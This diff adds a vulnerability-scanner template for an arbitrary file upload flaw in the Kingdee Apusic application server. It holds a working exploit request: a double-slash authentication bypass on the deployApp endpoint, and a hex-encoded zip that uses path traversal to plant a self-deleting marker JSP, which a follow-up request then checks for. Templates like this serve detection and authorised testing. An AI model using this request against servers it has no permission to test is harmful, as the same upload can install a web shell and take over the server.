@@ -1,0 +1,43 @@
+id: kingdee-apusic-deployapp-file-upload
+info:
+  name: Kingdee Apusic Application Server deployApp Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Kingdee Apusic application server's deployApp interface has an arbitrary file upload vulnerability. Attackers can bypass authentication using double slashes and upload malicious compressed packages to take over server permissions.
+  tags: file-upload
+  reference:
+    - http://www.kingdee.com
+
+variables:
+  boundary: "----WebKitFormBoundaryd9acIBdVuqKWDJbd"
+  hexPayload: "{{hex_decode('504B030414000000000013B1305676B81B6CC4000000C4000000360000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C2E6A73703C256F75742E7072696E746C6E286E657720537472696E67286E65772073756E2E6D6973632E4241534536344465636F64657228292E6465636F646542756666657228225A5445324E5451794D5445784D474A684D444D774F546C684D574D774D7A6B7A4D7A637A597A56694E444D3D222929293B6E6577206A6176612E696F2E46696C65286170706C69636174696F6E2E6765745265616C5061746828726571756573742E676574536572766C657450617468282929292E64656C65746528293B253E504B0102140314000000000013B1305676B81B6CC4000000C4000000360000000000000000000000A481000000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C2E6A7370504B0506000000000100010064000000180100000000')}}"
+
+http:
+  - raw:
+      - |
+        POST /admin//protect/application/deployApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        {{boundary}}\r\nContent-Disposition: form-data; name="appName"\r\n\r\n111\r\n{{boundary}}\r\nContent-Disposition: form-data; name="deployInServer"\r\n\r\nfalse\r\n{{boundary}}\r\nContent-Disposition: form-data; name="clientFile"; filename="evil.zip"\r\nContent-Type: application/x-zip-compressed\r\n\r\n{{hexPayload}}\r\n{{boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /shell.jsp HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
